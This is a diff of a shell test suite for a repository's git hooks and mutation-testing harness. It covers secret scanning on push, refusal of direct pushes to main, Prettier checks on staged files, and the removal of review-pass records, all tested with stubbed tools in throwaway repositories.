 cp "$here/repo_files.py" "$hs/repo/repo_files.py"
 cat >>"$hs/repo/repo_files.py" <<'PY'
 import contextlib, os, shutil, tempfile
@@ -2091,31 +2027,7 @@ shards 1 >/dev/null || : # keep1 to keep3 cached, with many0 next
 out=$(WARM=1 MANY=1 shards 1) || :
 out=$(WARM=1 MANY=97 BREAK_SECOND=hooks shards 2 --changed "$base") || :
 past "$out" || fail "harness_mutate --changed counted the verdicts of its cache against its limit: $out"
-# A merge's own mutants are those of the guard files changed since the last /pre-merge pass, not since base: the
-# pass judged what came before (as repo_files.last_reviewed finds it). i.txt changed before the pass, h.txt after it.
-base=$(git -C "$hs/repo" rev-parse HEAD)
-printf 'KEEP5 before the pass\n' >"$hs/repo/i.txt" && git -C "$hs/repo" commit -qam "before the pass"
-mkdir -p "$hs/repo/docs" && printf '# passes\n' >"$hs/repo/docs/review-passes.txt"
-(cd "$hs/repo" && python3 -I -c 'import sys; sys.dont_write_bytecode = True; sys.path.insert(0, sys.argv[1]); from repo_files import fingerprint
-print("2026-10-27", fingerprint("HEAD"), "lenses")' "$here") >>"$hs/repo/docs/review-passes.txt"
-git -C "$hs/repo" add docs && git -C "$hs/repo" commit -qm "the pass's record"
-printf 'KEEP4 SPARE2 after the pass\n' >"$hs/repo/h.txt" && git -C "$hs/repo" commit -qam "after the pass"
-out=$(shards 2 --changed "$base") && fail "harness_mutate --changed passed with a survivor changed after the pass: $out"
-printf '%s\n' "$out" | grep -q "^FAIL  survives: planted spare2 #1$" || fail "harness_mutate --changed skipped the file changed after the pass: $out"
-[ "$(verdicts "$out")" = 2 ] || fail "harness_mutate --changed judged more than the files changed after the pass: $out"
-printf '%s\n' "$out" | grep -q "killed: planted keep5" && fail "harness_mutate --changed judged a file changed before the pass: $out"
-printf '%s\n' "$out" | grep -q "2 of 7 mutants" || fail "harness_mutate --changed did not say how many it kept since the pass: $out"
-# A record that matches no commit of the range is no pass: since base, every guard file changed.
-printf '# passes\n2026-10-27 %s lenses\n' "$(printf x | git -C "$hs/repo" hash-object --stdin)" >"$hs/repo/docs/review-passes.txt"
-git -C "$hs/repo" commit -qam "a record of other code"
-out=$(shards 2 --changed "$base") && fail "harness_mutate --changed passed with a survivor and no pass: $out"
-[ "$(verdicts "$out")" = 3 ] || fail "harness_mutate --changed did not judge every file changed since base when no pass matched: $out"
-printf '%s\n' "$out" | grep -q "killed: planted keep5 #1$" || fail "harness_mutate --changed left out a file changed since base when no pass matched: $out"
-# No passes file at all: the same.
-git -C "$hs/repo" rm -q docs/review-passes.txt && git -C "$hs/repo" commit -qm "no record"
-out=$(shards 2 --changed "$base") && fail "harness_mutate --changed passed with a survivor and no passes file: $out"
-[ "$(verdicts "$out")" = 3 ] || fail "harness_mutate --changed did not judge every file changed since base with no passes file: $out"
-# Nothing changed since the pass, so no mutant to judge: it says so and runs no control either.
+# Nothing changed since its base, so no mutant to judge: it says so and runs no control either.
 out=$(shards 2 --changed "$(git -C "$hs/repo" rev-parse HEAD)") || fail "harness_mutate --changed failed with no mutant to judge: $out"
 printf '%s\n' "$out" | grep -q "0 of 7 mutants" || fail "harness_mutate --changed did not say it kept none: $out"
 [ ! -e "$hs/controls" ] && [ ! -e "$hs/probe_controls" ] || fail "harness_mutate --changed ran a control for no mutant: $out"
@@ -2184,7 +2096,7 @@ fi
 if part harness_shards_text; then
 shards_fixture
 # A file the branch marks `-diff` in .gitattributes (or one with a NUL byte) makes git print "Binary files differ", and a textconv
-# can turn its text into another: the changed lines are read as text, as the file is (F2537; merge.sh and scan_secrets.sh do too).
+# can turn its text into another: the changed lines are read as text, as the file is (F2537; scan_secrets.sh does too).
 base=$(git -C "$hs/repo" rev-parse HEAD)
 printf '* -diff\n' >"$hs/repo/.gitattributes" && printf 'LINE1 again\nLINE2\n' >"$hs/repo/m.txt" && git -C "$hs/repo" add .gitattributes && git -C "$hs/repo" commit -qam "a line changed, diff off"
 out=$(LINED=1 shards 2 --changed "$base") || fail "harness_mutate --changed failed on a file marked -diff: $out"
@@ -2199,47 +2111,14 @@ fi
 
 if part harness_shards_records; then
 shards_fixture
-# The pass's record, on scratch clones of the first commit (F1430 to F1434): a record names a tree, not a commit,
-# so the commit before it and its own both match; only the newest counts, and what changed after it is judged.
+# --changed on scratch clones of the first commit (F1433, F1434): what changed since its base is judged.
 HR=$hs/r2 && git clone -q "$hs/repo" "$HR" && C0=$(git -C "$HR" rev-list --max-parents=0 HEAD) && main_b=$(git -C "$HR" branch --show-current)
 fresh() { git -C "$HR" checkout -q "$main_b" && git -C "$HR" reset -q --hard "$C0" && git -C "$HR" branch -q -D side 2>/dev/null || :; }
 edit() { printf '%s\n' "$2" >"$HR/$1" && git -C "$HR" commit -qam "$1: $2"; }
-record() { # $1: the commit the pass was for (default HEAD); committed beside any other change in the tree
-	mkdir -p "$HR/docs" && (cd "$HR" && python3 -I -c 'import sys; sys.dont_write_bytecode = True; sys.path.insert(0, sys.argv[1]); from repo_files import fingerprint
-print("2026-10-27", fingerprint(sys.argv[2]), "lenses")' "$here" "${1:-HEAD}") >>"$HR/docs/review-passes.txt"
-	git -C "$HR" add docs && git -C "$HR" commit -qm "the pass's record"
-}
 judges() { # $1: the guard files' mutants it must judge, as "<verdicts> <of 7>"; the rest of $out is read by the caller
 	[ "$(verdicts "$out")" = "$1" ] || fail "harness_mutate --changed judged $(verdicts "$out") mutants, not $1: $out"
 	printf '%s\n' "$out" | grep -q " $2 of ${3:-7} mutants" || fail "harness_mutate --changed did not say $2 of ${3:-7}: $out"
 }
-# Two records: i.txt changed before the first, h.txt between them, g.txt after the second. The newest match counts,
-# not the oldest (the commit before a record and the record itself both match): only g.txt is judged (F1430, H1).
-fresh && edit i.txt "KEEP5 a" && record && edit h.txt "KEEP4 SPARE2 b" && record && edit g.txt "KEEP1 KEEP2 KEEP3 SPARE c"
-out=$(shards 2 --changed "$C0") && fail "harness_mutate --changed passed with a survivor changed after the newest record: $out"
-judges 4 4
-printf '%s\n' "$out" | grep -q "planted keep[45]\|spare2" && fail "harness_mutate --changed judged a file changed before the newest record: $out"
-# A record at HEAD, older base: nothing since the pass, so no mutant and no control; the same when harness_mutate.py
-# itself changed before the record (H3).
-record
-out=$(shards 2 --changed "$C0") || fail "harness_mutate --changed failed with a record at HEAD: $out"
-judges 0 0
-[ ! -e "$hs/controls" ] || fail "harness_mutate --changed ran a control for a record at HEAD: $out"
-printf '\n# a change of its own\n' >>"$HR/harness_mutate.py" && git -C "$HR" commit -qam "itself" && record
-out=$(shards 2 --changed "$C0") || fail "harness_mutate --changed failed with harness_mutate.py changed before the record: $out"
-judges 0 0
-[ ! -e "$hs/controls" ] || fail "harness_mutate --changed ran a control after the pass that saw harness_mutate.py change: $out"
-# A record of a commit before the base (the normal state: the passes file holds main's history) is no pass of the
-# range: since base, so i.txt, changed before the base, is left out and h.txt judged (H4).
-fresh && record "$C0" && edit i.txt "KEEP5 d" && base=$(git -C "$HR" rev-parse HEAD) && edit h.txt "KEEP4 SPARE2 e"
-out=$(shards 2 --changed "$base") && fail "harness_mutate --changed passed with a survivor after a base that follows an old record: $out"
-judges 2 2
-printf '%s\n' "$out" | grep -q "killed: planted keep5" && fail "harness_mutate --changed judged a file changed before its base: $out"
-# A record commit that also edits a guard file: its tree is not the one the pass saw, so it is no record of itself;
-# the pass is the commit before, and h.txt, changed in the record's commit, is judged (H5).
-fresh && edit i.txt "KEEP5 f" && printf 'KEEP4 SPARE2 f\n' >"$HR/h.txt" && git -C "$HR" add h.txt && record
-out=$(shards 2 --changed "$C0") && fail "harness_mutate --changed passed with a survivor changed in the record's own commit: $out"
-judges 2 2
 # A guard file renamed away counts as changed: git shows only the new name by default, and the old guard file's
 # mutants must still be judged (H5).
 fresh && git -C "$HR" mv i.txt i2.txt && git -C "$HR" commit -qm rename
@@ -2251,28 +2130,8 @@ fresh && edit "$ac" "KEEP8 z"
 out=$(SPACED=1 shards 2 --changed "$C0") || fail "harness_mutate --changed failed on a guard file with a quoted name: $out"
 judges 1 1 8
 printf '%s\n' "$out" | grep -q "killed: planted keep8 #1$" || fail "harness_mutate --changed missed a guard file whose name git quotes: $out"
-# Merge commits: the record on a merge commit; then the record on the side branch only, with h.txt changed on the
-# main side and never reviewed: it is judged (H6).
-fresh && edit h.txt "KEEP4 SPARE2 g" && git -C "$HR" checkout -q -b side "$C0" && edit i.txt "KEEP5 g" && git -C "$HR" checkout -q "$main_b" &&
-	git -C "$HR" merge -q --no-ff -m merge side && record && edit g.txt "KEEP1 KEEP2 KEEP3 SPARE g"
-out=$(shards 2 --changed "$C0") && fail "harness_mutate --changed passed with a survivor after a record on a merge commit: $out"
-judges 4 4
-fresh && git -C "$HR" checkout -q -b side "$C0" && edit i.txt "KEEP5 h" && record && git -C "$HR" checkout -q "$main_b" && edit h.txt "KEEP4 SPARE2 h" &&
-	git -C "$HR" merge -q --no-ff -m merge side
-out=$(shards 2 --changed "$C0") && fail "harness_mutate --changed passed with a survivor changed beside a record on a side branch: $out"
-judges 2 2
-printf '%s\n' "$out" | grep -q "^FAIL  survives: planted spare2 #1$" || fail "harness_mutate --changed excluded a file changed on the main side after a side branch's record: $out"
-# A passes file that is not one: a line with one field, or bytes that are no UTF-8, refuses with a message, before
-# any worktree (H7).
-fresh && mkdir -p "$HR/docs" && for bad in 'garbage\n' '2026-10-27 \377 lenses\n'; do
-	printf "$bad" >"$HR/docs/review-passes.txt" && git -C "$HR" add docs && git -C "$HR" commit -qm "a bad record"
-	out=$(shards 2 --changed "$C0") && fail "harness_mutate --changed went on with a passes file that is malformed ($bad): $out"
-	printf '%s\n' "$out" | grep -q "cannot read the passes file" || fail "harness_mutate --changed refused a malformed passes file ($bad) without a message: $out"
-	printf '%s\n' "$out" | grep -q "Traceback" && fail "harness_mutate --changed let a malformed passes file ($bad) raise: $out"
-	[ ! -e "$hs/made" ] || fail "harness_mutate --changed made a worktree for a malformed passes file ($bad)"
-done
 # The full run (no argument) judges every mutant: none to judge there is a harness that lost its mutants, not a
-# green run (F1431, H2). With --changed, none selected is the pass saying nothing changed.
+# green run (F1431, H2). With --changed, none selected is nothing changed since its base.
 out=$(NONE=1 shards 2) && fail "harness_mutate passed with no mutant to judge and no --changed: $out"
 printf '%s\n' "$out" | grep -q "no mutant" || fail "harness_mutate did not say it had no mutant: $out"
 [ "$(count removed)" = "$(count made)" ] || fail "harness_mutate left worktrees behind with no mutant"
@@ -2364,13 +2223,6 @@ git -C "$hs/repo" commit -qam "a helper base has" && base=$(git -C "$hs/repo" re
 cp "$hs/hm.keep" "$hs/repo/harness_mutate.py" && cp "$hs/sp.keep" "$hs/repo/suite_parts.py" && git -C "$hs/repo" commit -qam "the helper dropped"
 out=$(shards 2 --changed "$base") || :
 [ "$(verdicts "$out")" = 0 ] && printf '%s\n' "$out" | grep -q " 0 of 8 mutants" || fail "harness_mutate --changed took every mutant for new when base's helper had a name this tree's lacks: $out"
-# A passes file it cannot read (a folder here): it refuses, before any worktree, and never judges fewer mutants.
-mkdir -p "$hs/repo/docs/review-passes.txt" && : >"$hs/repo/docs/review-passes.txt/x" && git -C "$hs/repo" add docs && git -C "$hs/repo" commit -qm "an unreadable record"
-rm -f "$hs/made"
-out=$(shards 2 --changed "$base") && fail "harness_mutate --changed went on with a passes file it cannot read: $out"
-printf '%s\n' "$out" | grep -q "cannot read the passes file" || fail "harness_mutate --changed did not say its passes file is unreadable: $out"
-[ "$(verdicts "$out")" = 0 ] || fail "harness_mutate --changed judged mutants with a passes file it cannot read: $out"
-[ ! -e "$hs/made" ] || fail "harness_mutate --changed made a worktree before reading its passes file"
 # What it refuses, before any worktree: a base git cannot compare with, one read as an option, any
 # other argument.
 out=$(shards 2 --changed no-such-base) && fail "harness_mutate --changed took a base that is no commit: $out"
@@ -2604,275 +2456,345 @@ printf '%s\n' "$out" | grep -q "no coverage report" || fail "patch_coverage did 
 printf '%s\n' "$out" | grep -q Traceback && fail "patch_coverage ended on a traceback with no coverage report: $out"
 fi
 
-if part review_pass; then
-# review_pass: /pre-merge records the tree it reviewed; a later change to the code voids it,
-# the review log committed after it does not.
-v="$t/review"
-mkdir -p "$v/docs" "$v/src"
-git -C "$v" init -q
-commit() { git -C "$v" add -A && git -C "$v" commit -qm "$1"; }
-echo one >"$v/src/a.ts" && echo log >"$v/docs/review-log.md" && commit base
-(cd "$v" && python3 -I "$rp" check HEAD >/dev/null 2>&1) && fail "review_pass accepted a tree nobody reviewed"
-(cd "$v" && python3 -I "$rp" record HEAD "test-auditor, code-review" >/dev/null) || fail "review_pass could not record a pass"
-echo more >>"$v/docs/review-log.md" && commit log
-(cd "$v" && python3 -I "$rp" check HEAD >/dev/null 2>&1) || fail "review_pass refused a tree whose only change is the review's own record"
-echo two >>"$v/src/a.ts" && commit code
-(cd "$v" && python3 -I "$rp" check HEAD >/dev/null 2>&1) && fail "review_pass accepted code changed after the review"
-fi
-
 if part pre_push; then
-# pre-push: a work branch gets the fast gate and the secret scan, main the full gate and a
-# review pass. A fake gate, a fake gitleaks and a throwaway repository stand in.
+# pre-push (D13173): every push is scanned for secrets, its whole history, by the scan installed beside the hook; main takes pull
+# requests alone (D13165), so a push of it is refused, its deletion too. Nothing of the working tree runs (F076). A fake gitleaks
+# and a throwaway repository stand in; $ph holds the hooks as installed.
 w="$t/push"
-mkdir -p "$w/scripts" "$w/.githooks" "$w/docs" "$t/pushbin"
-printf '#!/bin/sh\necho "gate $*" >>"$(dirname "$0")/../gate.log"\n' >"$w/scripts/check.sh"
+ph="$t/push-hooks" && mkdir -p "$ph" && cp "$hooks"/* "$ph/" && secrets_into "$ph/"
+mkdir -p "$w/scripts" "$t/pushbin"
+printf '#!/bin/sh\n: >"%s/ran"\n' "$w" >"$w/scripts/check.sh" && chmod +x "$w/scripts/check.sh" # what no hook may run
 printf '#!/bin/sh\necho scanned >>"%s/leaks.log"\nexit "${LEAKS:-0}"\n' "$w" >"$t/pushbin/gitleaks" && chmod +x "$t/pushbin/gitleaks"
-printf 'gate.log\nleaks.log\n' >"$w/.gitignore"
-cp "$rp" "$here/repo_files.py" "$w/scripts/" && cp "$hooks/pre-push" "$hooks/records.sh" "$w/.githooks/" && secrets_into "$w/.githooks/"
+printf 'leaks.log\nran\n' >"$w/.gitignore"
 git -C "$w" init -q && echo x >"$w/a.ts" && git -C "$w" add -A && git -C "$w" commit -qm base
 head=$(git -C "$w" rev-parse HEAD)
-hook() { (cd "$w" && PATH="$t/pushbin:$PATH" sh .githooks/pre-push origin url >/dev/null 2>&1); }
-push() { printf 'refs/heads/%s %s refs/heads/%s 0000000000000000000000000000000000000000\n' "$1" "$head" "$1" | hook; }
-passed() { (cd "$w" && python3 -I scripts/review_pass.py record HEAD test >/dev/null) && git -C "$w" add -A && git -C "$w" commit -qm pass && head=$(git -C "$w" rev-parse HEAD); }
-push slice-1a || fail "pre-push refused a work branch whose gate passes"
-[ "$(tail -n 1 "$w/gate.log")" = "gate " ] || fail "pre-push ran more than the fast gate for a work branch"
+zero=0000000000000000000000000000000000000000
+hook() { (cd "$w" && PATH="$t/pushbin:$PATH" sh "$ph/pre-push" origin url >/dev/null 2>&1); }
+# $1: the ref pushed; $2: the remote's commit, none by default; $3: the commit sent, HEAD's by default.
+push() { printf 'refs/heads/%s %s refs/heads/%s %s\n' "$1" "${3:-$head}" "$1" "${2:-$zero}" | hook; }
+push slice-1a || fail "pre-push refused a work branch with no secret"
 grep -q scanned "$w/leaks.log" || fail "pre-push did not scan a work branch for secrets"
 # In a subshell: sh keeps a variable set before a function call, which made every later push fail (F127).
 (LEAKS=1 push slice-1a) && fail "pre-push let a work branch through with a secret found"
-push main && fail "pre-push let main through with no review pass"
-(cd "$w" && python3 -I scripts/review_pass.py record HEAD test >/dev/null)
-push main && fail "pre-push let main through with a pass not yet committed"
-git -C "$w" add -A && git -C "$w" commit -qm pass && head=$(git -C "$w" rev-parse HEAD)
-push main || fail "pre-push refused main with a committed review pass"
-[ "$(tail -n 1 "$w/gate.log")" = "gate --full" ] || fail "pre-push did not run the full gate for main"
-# Main gets no harness change a commit does not declare: the branch's gate is its own harness (F089).
-since() { printf 'refs/heads/main %s refs/heads/main %s\n' "$head" "$1" | hook; }
-base=$head && printf 'allow = []\n' >"$w/scripts/gitleaks.toml" && echo z >"$w/c.ts"
-git -C "$w" add -A && git -C "$w" commit -qm "loosen the scan" && passed
-since "$base" && fail "pre-push let main take a harness change no commit declares"
-since 1111111111111111111111111111111111111111 && fail "pre-push passed main against a remote commit it cannot read (F116)"
-git -C "$w" commit -q --allow-empty -m "declare" -m "Harness-changed: scripts/gitleaks.toml" && passed
-since "$base" && fail "pre-push took a declaration with no reason"
-git -C "$w" commit -q --allow-empty -m "declare" -m "Harness-changed: scripts/gitleaks.toml - the test's own rules" && passed
-since "$base" || fail "pre-push refused main with its harness change declared"
-printf '#!/bin/sh\nexit 1\n' >"$w/scripts/check.sh"
-git -C "$w" add -A && git -C "$w" commit -qm "failing gate" && head=$(git -C "$w" rev-parse HEAD)
-push slice-1a && fail "pre-push let a push through a failing gate"
-
-# pre-push refuses a push of anything but the checked-out commit, clean.
-echo y >"$w/b.ts" && git -C "$w" add -A && git -C "$w" commit -qm more
-printf '#!/bin/sh\nexit 0\n' >"$w/scripts/check.sh"
-old=$(git -C "$w" rev-parse HEAD~1)
-printf 'refs/heads/x %s refs/heads/x 0000000000000000000000000000000000000000\n' "$old" | hook && fail "pre-push let through a commit other than the checked-out one"
-echo dirty >>"$w/b.ts"
-head=$(git -C "$w" rev-parse HEAD) && push slice-1a && fail "pre-push let through a tree with uncommitted changes"
-git -C "$w" checkout -q -- b.ts
-touch "$w/stray.ts" && push slice-1a && fail "pre-push let through a tree with an untracked file"
-rm "$w/stray.ts"
+: >"$w/leaks.log"
+printf 'refs/tags/v1 %s refs/tags/v1 %s\n' "$head" "$zero" | hook || fail "pre-push refused a tag with no secret"
+grep -q scanned "$w/leaks.log" || fail "pre-push did not scan a tag for secrets"
+# A commit other than the one checked out, and a branch named like main, are pushed as any branch.
+echo y >"$w/b.ts" && git -C "$w" add b.ts && git -C "$w" commit -qm more
+push older "$zero" "$(git -C "$w" rev-parse HEAD~1)" || fail "pre-push refused a commit other than the checked-out one"
+push mainline || fail "pre-push refused a branch whose name starts with main"
+head=$(git -C "$w" rev-parse HEAD)
+# main: refused, a new one, an update or its deletion, alone or behind another ref, saying why.
+push main && fail "pre-push let a new main through (D13165)"
+push main "$(git -C "$w" rev-parse HEAD~1)" && fail "pre-push let an update of main through (D13165)"
+printf 'refs/heads/main %s refs/heads/main %s\n' "$zero" "$head" | hook && fail "pre-push let main's deletion through (D13165)"
+printf 'refs/heads/x %s refs/heads/x %s\nrefs/heads/main %s refs/heads/main %s\n' "$head" "$zero" "$head" "$zero" | hook &&
+	fail "pre-push let main through behind another ref (D13165)"
+printf 'refs/heads/main %s refs/heads/main %s\n' "$head" "$zero" | (cd "$w" && PATH="$t/pushbin:$PATH" sh "$ph/pre-push" origin url 2>&1 >/dev/null) |
+	grep -qF "main takes pull requests alone" || fail "pre-push refused main without saying why"
+# main is the remote's ref: a branch pushed as main (`git push origin feature:main`, `HEAD:main`) is refused, a local main pushed as
+# another branch, or a tag named main, is not (the red pass, M2).
+printf 'refs/heads/feature %s refs/heads/main %s\n' "$head" "$zero" | hook && fail "pre-push let a branch through pushed as main (D13165)"
+printf 'refs/heads/main %s refs/heads/other %s\n' "$head" "$zero" | hook || fail "pre-push refused a local main pushed as another branch"
+printf 'refs/tags/main %s refs/tags/main %s\n' "$head" "$zero" | hook || fail "pre-push refused a tag named main"
+# A branch's deletion sends nothing to scan, and is no refusal: a scan that would find a secret is not run (L1).
+printf 'refs/heads/old %s refs/heads/old %s\n' "$zero" "$head" | hook || fail "pre-push refused a branch's deletion"
+(printf 'refs/heads/old %s refs/heads/old %s\n' "$zero" "$head" | LEAKS=1 hook) || fail "pre-push scanned a push that sends nothing"
+# A tree with uncommitted or untracked files pushes its commits as they are: no gate reads the tree since D13173 (L3).
+echo dirty >>"$w/a.ts" && touch "$w/stray.ts"
+push slice-1a || fail "pre-push refused a push from a tree with uncommitted files"
+git -C "$w" checkout -q -- a.ts && rm "$w/stray.ts"
+# With no gitleaks to run, nothing leaves unscanned.
+printf 'refs/heads/slice-1a %s refs/heads/slice-1a %s\n' "$head" "$zero" | (cd "$w" && PATH=/usr/bin:/bin sh "$ph/pre-push" origin url >/dev/null 2>&1) &&
+	fail "pre-push let a branch through with no gitleaks to scan it"
+# With no scan beside the hook, nothing leaves unscanned (F113).
+mv "$ph/scan_secrets.sh" "$t/push-scan.away"
+push slice-1a && fail "pre-push let a branch through with no scan_secrets.sh beside it"
+mv "$t/push-scan.away" "$ph/scan_secrets.sh"
+[ ! -e "$w/ran" ] || fail "pre-push ran the working tree's code (F076)"
 fi
 
 if part pre_commit; then
-# pre-commit runs the gate on the staged files, and a failing gate stops the commit.
+# pre-commit (D13173): no secret enters a commit, prose included; in Claude Code's sandbox no harness file either (D241), the staged
+# files are formatted (Prettier) and the docs checked (check_docs.py). It runs from git's hooks folder, beside the scripts it runs, as
+# installed: here $hk, a copy of the hooks and the secret scan.
 c2="$t/precommit"
-precommit() { (cd "$c2" && sh "$hooks/pre-commit" "$@" >/dev/null 2>&1); }
-mkdir -p "$c2/scripts" && git -C "$c2" init -q && good_rules "$c2"
-printf '#!/bin/sh\nexit 1\n' >"$c2/scripts/check.sh" && cp "$here/code_changed.sh" "$here/borrow_node_modules.sh" "$here/check_docs.py" "$here/hidden.py" "$here/repo_files.py" "$here/speeds.py" "$c2/scripts/" && secrets_into "$c2/scripts/" && git -C "$c2" add -A && git -C "$c2" commit -qm base
-echo code >"$c2/a.ts" && git -C "$c2" add a.ts
-precommit && fail "pre-commit let a commit through a failing gate"
-[ ! -e "$c2/.claude/tmp/green-fast" ] || fail "pre-commit recorded code whose gate failed (F076)"
-printf '#!/bin/sh\nexit 0\n' >"$c2/scripts/check.sh" && git -C "$c2" commit -qm gate scripts/check.sh # a harness file is committed outside (D241)
-precommit || fail "pre-commit stopped a commit whose gate passes"
-grep -qxF "$(cd "$c2" && . "$hooks/records.sh" && code_print "$(git write-tree)")" "$c2/.claude/tmp/green-fast" || fail "pre-commit did not record the code it passed (F076)"
-# A secret in what is staged stops the commit, docs included.
-mkdir -p "$t/leakbin" && printf '#!/bin/sh\nexit 1\n' >"$t/leakbin/gitleaks" && chmod +x "$t/leakbin/gitleaks"
-(cd "$c2" && PATH="$t/leakbin:$PATH" sh "$hooks/pre-commit" >/dev/null 2>&1) && fail "pre-commit let a commit through a secret scan that found one"
-git -C "$c2" commit -qm code && mkdir -p "$c2/docs" && echo prose >"$c2/docs/a.md" && git -C "$c2" add docs/a.md
+hk="$t/precommit-hooks" && mkdir -p "$hk" && cp "$hooks"/* "$hk/" && secrets_into "$hk/"
+mkdir -p "$c2/scripts" "$c2/node_modules/.bin" "$c2/docs" && git -C "$c2" init -q && good_rules "$c2"
+# Prettier, a stub: it marks that it ran, logs its arguments one a line, and fails on a file that holds the word unformatted.
+cat >"$c2/node_modules/.bin/prettier" <<SH
+#!/bin/sh
+: >"$t/prettier-ran"
+for a; do printf '%s\n' "\$a"; done >"$t/prettier-args"
+for a; do case \$a in -*) ;; *) [ ! -L "\$a" ] || { echo "a link named: \$a" >&2; exit 2; }; ! grep -q unformatted "\$a" || exit 1 ;; esac; done
+SH
+chmod +x "$c2/node_modules/.bin/prettier"
+printf '{"scripts": {"format:check": "prettier --check --log-level warn ."}}\n' >"$c2/package.json"
+cp "$here/check_docs.py" "$here/hidden.py" "$here/repo_files.py" "$here/speeds.py" "$c2/scripts/"
+printf 'node_modules\n' >"$c2/.gitignore"
+git -C "$c2" add -A && git -C "$c2" commit -qm base
+precommit() { (cd "$c2" && sh "$hk/pre-commit" "$@" >/dev/null 2>&1); }
+said() { ! out=$(cd "$c2" && sh "$hk/pre-commit" 2>&1 >/dev/null) && printf '%s\n' "$out" | grep -qF "$1"; } # refused, saying $1
+prettier_handed() { sed -n '/^--$/,$p' "$t/prettier-args" | sed 1d; }
+fresh() { git -C "$c2" reset -q --hard && git -C "$c2" clean -qfd && mkdir -p "$c2/docs" && rm -f "$t/prettier-ran" "$t/prettier-args"; }
+# A formatted change passes; Prettier checks it, and unknown files it leaves alone, handed the staged files alone after `--`.
+echo code >"$c2/a.ts" && echo untracked >"$c2/u.ts" && git -C "$c2" add a.ts
+precommit || fail "pre-commit stopped a formatted commit with no secret"
+[ "$(prettier_handed)" = a.ts ] || fail "pre-commit handed Prettier other files than the commit's: $(cat "$t/prettier-args" 2>/dev/null)"
+grep -qx -- --check "$t/prettier-args" && grep -qx -- --ignore-unknown "$t/prettier-args" ||
+	fail "pre-commit ran Prettier without --check and --ignore-unknown: $(cat "$t/prettier-args")"
+git -C "$c2" commit -qm a && fresh
+echo unformatted >>"$c2/a.ts" && git -C "$c2" add a.ts
+precommit && fail "pre-commit let an unformatted file through"
+fresh
+# A name with a space reaches Prettier whole (an accent is refused: F164, below); a deleted file is not handed.
+mkdir -p "$c2/sub dir" && echo x >"$c2/my file.ts" && echo x >"$c2/sub dir/a b.ts" && git -C "$c2" add "my file.ts" "sub dir/a b.ts" && git -C "$c2" rm -q a.ts
+precommit || fail "pre-commit refused files named with a space"
+[ "$(prettier_handed | LC_ALL=C sort | paste -sd'|' -)" = "my file.ts|sub dir/a b.ts" ] ||
+	fail "pre-commit did not hand Prettier the staged names whole, deletions left out: $(prettier_handed)"
+fresh
+# A staged link is handed to no Prettier, which refuses a link named on its line (the combined review, R3).
+fresh && ln -s a.ts "$c2/l.ts" && git -C "$c2" add l.ts && echo more >>"$c2/a.ts" && git -C "$c2" add a.ts
+precommit || fail "pre-commit refused a staged link, handing it to Prettier"
+[ "$(prettier_handed)" = a.ts ] || fail "pre-commit handed Prettier a link: $(prettier_handed)"
+fresh
+# Prettier runs as package.json's format:check says, the one place its command is written (R7): a flag added there reaches it; a
+# command that does not end on the whole repository, or a package.json node cannot read, refuses.
+cp "$c2/package.json" "$t/package.json"
+printf '{"scripts": {"format:check": "prettier --check --log-level warn --no-config ."}}\n' >"$c2/package.json" && echo more >>"$c2/a.ts" && git -C "$c2" add a.ts
+precommit && grep -qx -- --no-config "$t/prettier-args" || fail "pre-commit did not run Prettier as package.json's format:check says: $(cat "$t/prettier-args" 2>/dev/null)"
+printf '{"scripts": {"format:check": "prettier --check src"}}\n' >"$c2/package.json"
+said "format:check" || fail "pre-commit ran a format:check that does not end with ' .'"
+printf 'not json\n' >"$c2/package.json"
+said "format:check" || fail "pre-commit went on with a package.json node cannot read"
+cp "$t/package.json" "$c2/package.json"
+fresh
+# A deletion alone hands Prettier nothing, so a missing Prettier stops no such commit.
+git -C "$c2" rm -q a.ts && mv "$c2/node_modules/.bin/prettier" "$t/prettier.away"
+precommit || fail "pre-commit refused a deletion alone, which hands Prettier nothing"
+# With a file to check, a missing Prettier refuses: nothing is committed unchecked.
+fresh && echo more >>"$c2/a.ts" && git -C "$c2" add a.ts
+precommit && fail "pre-commit passed with no Prettier to check the staged files"
+mv "$t/prettier.away" "$c2/node_modules/.bin/prettier"
+# Prettier reads the disk: a staged file changed since it was staged is refused, before Prettier runs, never checked in a form
+# the commit does not hold; an untracked file is not in the commit and stops nothing.
+fresh && echo staged >>"$c2/a.ts" && git -C "$c2" add a.ts && echo unformatted >>"$c2/a.ts"
+said "stage them as they are on disk" || fail "pre-commit checked a staged file whose disk copy differs from what the commit holds"
+[ ! -e "$t/prettier-ran" ] || fail "pre-commit ran Prettier on a file the commit does not hold as it is on disk"
+fresh && mkdir -p "$c2/sub dir" && echo staged >"$c2/sub dir/a b.ts" && git -C "$c2" add "sub dir/a b.ts" && echo unformatted >>"$c2/sub dir/a b.ts"
+said "stage them as they are on disk" || fail "pre-commit checked a staged file named with a space whose disk copy differs"
+# A staged name is a name, never a pathspec: one that reads as git's magic (`:(exclude)a.ts`, `*.ts`) took a.ts out of the
+# comparison, and a.ts, staged unformatted under a formatted disk copy, passed (the red pass, M3).
+for name in ':(exclude)a.ts' '*.ts'; do
+	fresh && echo unformatted >>"$c2/a.ts" && git -C "$c2" add a.ts && git -C "$c2" show HEAD:a.ts >"$c2/a.ts"
+	echo x >"$c2/$name" && git -C "$c2" --literal-pathspecs add -- "$name"
+	said "stage them as they are on disk" || fail "pre-commit read the staged name $name as a pathspec, and checked a.ts as it is not committed"
+done
+# A staged file gone from the disk is not as it is staged.
+fresh && echo staged >>"$c2/a.ts" && git -C "$c2" add a.ts && rm "$c2/a.ts"
+said "stage them as they are on disk" || fail "pre-commit checked a staged file gone from the disk"
+fresh && echo staged >>"$c2/a.ts" && git -C "$c2" add a.ts && echo unformatted >"$c2/u.ts"
+precommit || fail "pre-commit refused a commit for an untracked file it does not hold"
+# A git that cannot list the files to check, or compare them with the disk, lets nothing through unchecked.
+real_git=$(command -v git)
+mkdir -p "$t/listless" "$t/cmpless"
+printf '#!/bin/sh\ncase " $* " in *" --name-only -z --diff-filter=d "*) exit 128 ;; esac\nexec "%s" "$@"\n' "$real_git" >"$t/listless/git"
+printf '#!/bin/sh\ncase " $* " in *" diff --name-only -- "*) exit 128 ;; esac\nexec "%s" "$@"\n' "$real_git" >"$t/cmpless/git"
+chmod +x "$t/listless/git" "$t/cmpless/git"
+(cd "$c2" && PATH="$t/listless:$PATH" sh "$hk/pre-commit" >/dev/null 2>&1) && fail "pre-commit passed when git could not list the files Prettier checks"
+(cd "$c2" && PATH="$t/cmpless:$PATH" sh "$hk/pre-commit" >/dev/null 2>&1) && fail "pre-commit passed when git could not compare the staged files with the disk"
